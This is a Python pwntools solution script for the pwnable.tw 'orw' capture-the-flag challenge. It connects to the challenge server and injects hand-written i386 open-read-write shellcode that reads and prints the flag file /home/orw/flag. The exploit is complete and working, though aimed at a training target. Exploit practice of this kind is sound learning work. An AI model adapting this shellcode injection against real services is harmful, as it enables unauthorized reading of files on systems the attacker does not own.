#!/usr/bin/env python3
from pwn import *

elf = ELF("./given/orw")
context.arch = "i386"
def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10001)
    else:
        p = process([elf.path])
        if args.D:
            # break point at shellcode
            # PROBLEM: gdb will send a null byte at the first
            gdb.attach(p, """b *0x804a060""")
    return p

def shellcode():
    orw = asm(
        """
        xor ecx, ecx;
        push ecx;
        push 0x67616c66;
        push 0x2f77726f;
        push 0x2f656d6f;
        push 0x682f2f2f;
        push esp;
        pop ebx;
        mov eax, SYS_open;
        int 0x80

        mov edx, 0x30;
        mov ecx, esp;
        mov ebx, eax;
        mov eax, SYS_read;
        int 0x80

        mov edx, 0x30;
        mov ecx, esp;
        mov ebx, 1;
        mov eax, SYS_write;
        int 0x80
        """)
    with open("./sc", "wb") as f:
        f.write(orw)
        f.close()
    return orw

def exploit():
    p = conn()
    p.recv()
    p.send(shellcode())
    p.interactive()

if __name__ == "__main__":
    exploit()
